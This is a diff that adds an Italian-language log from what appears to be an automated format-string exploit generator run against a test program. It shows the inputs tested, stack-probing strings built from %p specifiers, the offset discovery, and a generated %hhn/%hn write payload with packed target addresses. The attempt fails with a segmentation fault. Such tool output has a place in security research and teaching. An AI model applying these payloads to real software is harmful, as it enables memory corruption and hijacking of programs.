@@ -1,0 +1,68 @@
+Byte da scrivere: 4
+Dimensione indirizzi: 8 byte
+Endian: little
+
+Input da linea di comando: [{'type': 'command_line_input', 'value': '100', 'free': False}, {'type': 'command_line_input', 'value': '2', 'free': False}, {'type': 'command_line_input', 'value': '7', 'free': False}, {'type': 'command_line_input', 'value': '4', 'free': False}, {'type': 'command_line_input', 'value': '3', 'free': False}, {'type': 'command_line_input', 'value': '0', 'free': False}]
+Input da passare durante l'esecuzione: [{'type': 'execution_input', 'marker': 'Insert a number: ', 'value': 'PPPP', 'free': True}]
+Preparazione indirizzi e scrittori: 
+   Sottovalori da scrivere: | 48 | 32 | 96 | 
+   Relative dimensioni di scrittura: [1, 1, 2]
+   Relativi nuovi indirizzi target: | 0x601050 | 0x601051 | 0x601052 | 
+   Scrittori: [['%32x', None, 'hhn'], ['%16x', None, 'hhn'], ['%48x', None, 'hn']]
+
+
+Inizio ricerca di input vulnerabili
+
+Input in test: {'type': 'command_line_input', 'value': '100', 'free': False}
+Input non libero
+
+Input in test: {'type': 'command_line_input', 'value': '2', 'free': False}
+Input non libero
+
+Input in test: {'type': 'command_line_input', 'value': '7', 'free': False}
+Input non libero
+
+Input in test: {'type': 'command_line_input', 'value': '4', 'free': False}
+Input non libero
+
+Input in test: {'type': 'command_line_input', 'value': '3', 'free': False}
+Input non libero
+
+Input in test: {'type': 'command_line_input', 'value': '0', 'free': False}
+Input non libero
+
+Input in test: {'type': 'execution_input', 'marker': 'Insert a number: ', 'value': 'PPPP', 'free': True}
+Input libero, verifica se exploitabile: input exploitabile
+Verifica stampa della dimensione minima della stringa di exploit (44 caratteri): dimensione minima stampata
+Definizione marcati per estrarre fmt nella risposta: ll, sp
+Conteggio della dimensione effettiva dell'input (fino a 548 caratteri): 46 caratteri disponibili + 4 caratteri usati dai marcatori
+Ricerca fmt su stack: 
+   Stringa di ricerca: llAAAAAAAA%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$pGGsp
+   Valori esadecimali estratti: ['400806', '0', '0', '7ffff7fe14c0', '0', '7fffffffddf8', '700f0b5ff', '4141414141416c6c', '3225702431254141']
+    Valore 1 -> 400806
+    Valore 2 -> 0
+    Valore 3 -> 0
+    Valore 4 -> 7ffff7fe14c0
+    Valore 5 -> 0
+    Valore 6 -> 7fffffffddf8
+    Valore 7 -> 700f0b5ff
+    Valore 8 -> 4141414141416c6c
+    Valore 9 -> 3225702431254141
+
+   Verifica posizione:
+   Stringa di conferma: llBBBBBBBB%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$pGGsp
+   Valori esadecimali estratti: ['400806', '0', '0', '7ffff7fe14c0', '0', '7fffffffddf8', '700f0b5ff', '4242424242426c6c', '3225702431254242']
+    Valore 8 -> 4242424242426c6c
+    Valore 9 -> 3225702431254242
+   Posizione 8
+Generazione fmt per exploit nel formato 'scrittori-indirizzi': 
+   Scrittori: [['%32x', '%12$', 'hhn'], ['%16x', '%13$', 'hhn'], ['%48x', '%14$', 'hn']]
+   Padding di allineamento: ''
+   ATTENZIONE: la dimensione dell'input non è suffichiente a stampare l'fmt di exploit (56 caratteri richiesti), si prosegue comunque con l'exploit essendo disattivato il controllo sulla lunghezza
+   Generazione completata con successo
+La stringa generata è: 
+		b'%32x%12$hhn%16x%13$hhn%48x%14$hnQ\x10`\x00\x00\x00\x00\x00P\x10`\x00\x00\x00\x00\x00R\x10`\x00\x00\x00\x00\x00'
+Inizio exploit: segmentation fault incontrato tentando l'exploit 
+Passaggo alla generazione della stringa nel formato 'indirizzi-scrittori': Almeno un indirizzo target contiene un null byte che non può essere inviato a causa della costruzione della fmt di exploit
+
+Nessun input exploitabile individuato
